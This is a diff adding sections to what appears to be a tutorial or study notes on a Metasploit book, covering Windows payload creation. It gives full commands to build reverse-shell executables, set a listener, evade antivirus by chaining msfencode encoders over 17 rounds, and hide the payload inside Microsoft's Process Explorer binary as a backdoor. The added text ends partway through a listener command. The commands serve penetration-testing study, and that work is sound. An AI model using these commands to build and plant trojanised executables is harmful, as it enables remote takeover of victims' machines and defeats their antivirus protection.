@@ -475,6 +475,95 @@ To avoid AVs, we can create custom payloads that don't contain any known signatu
 ## Creation of autonomous binaries with MSFpayload
 {:style="color:DarkRed; font-size: 170%;"}
 
+We will start by creating a simple reverse shell that connects to the attacker and returns a shell. We will use *msfpayload* and *windows/shell_reverse_tcp*.\\
+Let's look at the available options for the *shell_reverse_tcp* payload with the *O* flag:
+
+~~~~
+msfpayload windows/shell_reverse_tcp O
+~~~~~~
+
+There are 3 required parameters: *EXITFUNC*, *LHOST* and *LPORT*.\\
+The *EXITFUNC* sets a function hash in the payload that specifies a DLL (Dynamic Link Library) and function to call when the payload is complete. A **DLL injection** is a technique used to execute code within the address space of another process by forcing it to load a dynamic link library. There are 4 different values for *EXITFUNC*:
+
+- NONE: this method calls *GetLastError*, effectively a **no-op**. The thread continues executing, allowing us to cat multiple paylaods together.
+- SEH: this method should be used when there is a structured exception handler (SEH), which will restart the thread or process automatically when an error occurs.
+- THREAD: this method is used when the exploited process runs the shellcode in a sub-thread and exiting this thread results in a working application/system.
+- PROCESS: this method should be used with multi/handler, or with any exploit where a master process restarts it on exit.
+
+In the output of the previous command, *EXITFUNC* is set to *process* and LPORT (listen port) to 4444. We have to set LHOST (listen address).\\
+We will now create this payload in *Windos Portable Executable* (PE) format. PE format is a file format for executables, object code, DLLs and others used in 32-bit and 64-bit versions of Windows OS.\\
+To do so, we add the option *X*:
+
+~~~~~
+msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 X > /var/www/payload1.exe
+file /var/www/payload1.exe
+~~~~~~
+
+Now that we have an executable, we can set a listener with the module *multi/handler* in msfconsole. This module allows metasploit to listen to reverse connections.\\
+In msfconsole, we type the following commands:
+
+~~~~~
+use exploit/multi/handler
+show options
+set PAYLOAD windows/shell_reverse_tcp
+set LHOST 192.168.1.101
+set LPORT 31337
+~~~~~~
+
+We are ready for the next step, avoiding AVs.
+
+## Avoid antivirus detection
+{:style="color:DarkRed; font-size: 170%;"}
+
+In the book, they use the AVG antivirus. They start by making sure the AV detects the payload in its current state (which it does).
+
+<ins>**Encode with MSFencode**</ins>\\
+One of the best way to avoid AV detection is to encode the payload with MSFencode. This tool modifies the code of a payload so that it isn't detected by an AV. It encodes the original executable in a new binary file. Then, when it is executed, msfencode decodes the original code in memory and execute it.
+
+The command *msfencode -h* displays the options. Among those, encoding formats are very important (we can see them with *msfencoode -l*). Different encoders are used for different platforms (for example, a Power PC (PPC) encoder will not work on a x86 platform because of the differences between the two architectures).\\
+One of the best encoder is **x86/shikata_ga_nai**. Let's encode a Metasploit payload:
+
+~~~~
+msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 R | msfencode -e x86/shikata_ga_nai -t exe > /var/www/payload2.exe
+file /var/www/payload2.exe
+~~~~~~
+
+We added the flag *R* to specify raw output, because we redirected it directly in msfencode with a pipe (|). We used the shikata_ga_nai encoder and asked msfencode to save the executable in the file /var/www/payload2.exe. Finally, we make sure that the resulting file is Windows executable (with *file /var/www/payload2.exe*).\\
+However, when the file payload2.exe is copied on the Windows system, it is still detected by the AV (eventhough it is encoded). This brings us to the next section.
+
+## Multiencoding
+{:style="color:DarkRed; font-size: 170%;"}
+
+Our payload was detected because AVs signatures are frequently updated to detect new payloads (and the modified ones).\\
+Multiencoding allows to encode a file multiple times to get rid of AVs that verify signatures.
+
+In the encoder descriptions, it is said that shikata_ga_nai is **polymorphic**: the payload changes each time the script is executed. Because it is random, it will sometimes be detected, and sometimes it won't.\\
+It is a good practice to test the script with an AV before using it in a pentest.
+
+Here is an example of a multiencoding:
+
+~~~~
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=31337 R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/countdown -c 5 -t exe -o /var/www/payload3.exe
+file /var/www/payload3.exe
+~~~~~
+
+The flag *-c 5* is used to indicate that we want the payload to be encoded 5 times. Here, we used a total of 17 encoding loops. This time, the payload is not detected by the AV.
+
+## Customized executables
+{:style="color:DarkRed; font-size: 170%;"}
+
+Usually, when msfencode is executed, the payload is integrated in the default executable model *data/templates/template.exe*. Eventhough this model is modified from time to time, AVs sellers frequently check it when creating signatures.\\
+Msfencode now takes over the use of a Windows executable instead of the default via the option *-x*. In the follwing example, we code our new payload with the Process Explorer of Sysinternals Suite from Microsoft as a new custom executable:
+
+~~~~
+wget http://download.sysinternals.com/Files/ProcessExplorer.zip
+cd work/
+unzip ../ProcessExplorer.zip
+cd..
+msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 R | msfencode -t exe -x work/procexp.exe -o /var/www/pe_backdoor.exe -e x86/shikata_ga_nai -c 5
+msfcli exploit/multi/handler PAYLOAD=windows
+
+
 # Client side attacks exploitation
 
 # Metasploit : auxiliary modules
